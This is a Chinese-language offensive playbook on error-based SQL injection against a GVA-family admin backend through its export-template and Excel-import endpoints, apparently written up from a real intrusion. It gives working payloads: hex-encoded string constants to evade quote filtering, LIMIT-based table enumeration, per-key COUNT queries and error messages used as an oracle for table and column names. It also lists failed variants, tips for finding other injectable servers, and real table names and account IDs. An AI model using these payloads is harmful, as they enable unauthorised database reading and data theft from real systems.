# 读侧载荷工程学(导出模板注入 / 同型 app 层 SQLi)

实测环境:二开 GVA 家族后台,`sysExportTemplate` + `importExcel` 注入点,
通过 MySQL 报错回显读库。以下写法**逐条实测过**,失败写法也列出,避免重复踩。

## 一、字符串常量一律走 hex

包装层对引号敏感:`'app'` 会破坏语句,`0x617070` 全程正常。

```sql
(table_schema=0x617070)        -- 'app'
```

## 二、表名枚举:一条一个名

`GROUP_CONCAT(table_name)` 能过,但有 **1024 字节上限**,超出静默截断;
`SUBSTRING(GROUP_CONCAT(...), N, ...)` 取不到 1024 之后的部分(**不是**分页手段)。

唯一稳的方式 —— `LIMIT i,1` 循环,每条注入取一个表名:

```sql
(SELECT table_name FROM information_schema.tables
 WHERE table_schema=0x617070 ORDER BY table_name LIMIT {i},1)
```

实测 i 递增能拿到完整表清单(目标库 161 张表)。表名前缀常直接暴露框架
(如 `gva_app_agents` / `gva_app_employees` / `gva_app_user_devices` —— 见名知义,省掉猜列)。

## 三、失败写法清单(全部返回 `record not found` = 静默 NULL)

在**同一个**注入点上,下列谓词**全军覆没**,而同期 `table_schema=0x...` 正常:

| 写法 | 结果 |
|---|---|
| `table_name LIKE '%dev%'`(带引号) | 静默 NULL |
| `table_name LIKE CONCAT(0x25,0x646576,0x25)` | 静默 NULL |
| `LOCATE(0x646576, table_name) > 0` | 静默 NULL |
| `table_name > 0x6776615f...`(字符串比较) | 静默 NULL |

⇒ **不要据此写"目标库没有 device/agent 表"的结论** —— 是谓词写法过不去。
用 `LIMIT i,1` 把名字全枚举出来再人工筛,成本可控(161 条)。

## 四、聚合:`COUNT(*)` 能过,带子查询的聚合不能

- ✅ `(SELECT COUNT(*) FROM app.gva_app_user_devices WHERE agent_id=8)`
- ❌ 相关子查询版:`(SELECT GROUP_CONCAT(CONCAT(a.id,':',(SELECT COUNT(*) ...))) FROM ...)`
- ❌ 派生表版:`(SELECT GROUP_CONCAT(...) FROM (SELECT k, COUNT(*) FROM t GROUP BY k) z)`

**替代方案:逐键一条 COUNT,** 键空间小的时候完全够用(实测 10 个代理 = 10 条查询,
每条约 20-40 秒)。先 `(SELECT COUNT(*) FROM <t>)` 拿总量,再逐键跑,差额就是未归属行。

## 五、列名/表名探测:用报错当 oracle

- 表名:`Table 'app.devices' doesn't exist`(Error 1146)⇒ 换名重试,每次一个候选,能快速收敛
- 列名:`Unknown column 'login_username'` ⇒ 该表存在、列名不对,换名继续

不要因为一次 1146/Unknown column 就放弃整张表 —— 表存在才是关键信息。

## 六、一个注入点只覆盖它自己那套库

同家族**另一台**服务器,同路由前缀 `sysExportTemplate` 实测 **404**(模块未部署)。
⇒ 双机各自有库时,**库侧做不出跨机统计**;跨机统计只能回到 API 侧逐账号取。
判断某机是否可注入:先探 `getSysExportTemplateList` —— "路由存在但权限不足"也能证明模块在。

## 七、读回来的东西怎么用

- 表清单 → 挑出实体表(`*_agents` / `*_employees` / `*_user_devices` / `sys_users`)
- 逐键 COUNT → 得到 "每个代理/账号多少台设备" 这类业务口径统计
- **与 API 侧数字交叉验证**:库侧总量和 API 侧 `total` 不一致时,先确认
  两者是否同一个部署(用 `sys_users` 的 id 对账:`af00001=id5`、`panghu=id26` 对上即同库),
  再下结论。**两个口径差 100 倍时不要合并成一个数上报**,分开列。
